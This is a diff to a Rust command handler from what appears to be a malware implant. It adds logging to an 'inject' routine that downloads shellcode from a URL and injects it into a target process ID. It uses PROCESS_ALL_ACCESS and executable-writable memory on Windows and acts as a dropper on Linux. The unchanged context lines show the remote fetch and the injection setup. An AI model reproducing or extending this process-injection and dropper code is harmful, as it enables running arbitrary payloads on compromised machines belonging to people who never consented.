@@ -1,4 +1,5 @@
 use std::error::Error;
+use crate::logger::Logger;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
 #[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
@@ -12,7 +13,7 @@ use std::error::Error;
 /// Usage: `inject [shellcode_url] [pid]`
 /// 
 /// On Linux, the payload will be downloaded and executed like a regular dropper.
-pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
+pub async fn handle(s: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         // Input: url to shellcode -p pid
         let mut args = s.split(" ");
@@ -20,7 +21,7 @@ pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
         let url = args.nth(0).unwrap();
         // Get path as the 2nd arg or the last part of the URL
         if let Some(p) = args.nth(0) {
-            println!("Injecting into PID {:?}", p);
+            logger.debug(format!("Injecting into PID {:?}", p));
             let pid: u32 = p.parse()?;
             let client = Client::new();
             let r = client.get(url).send().await?;
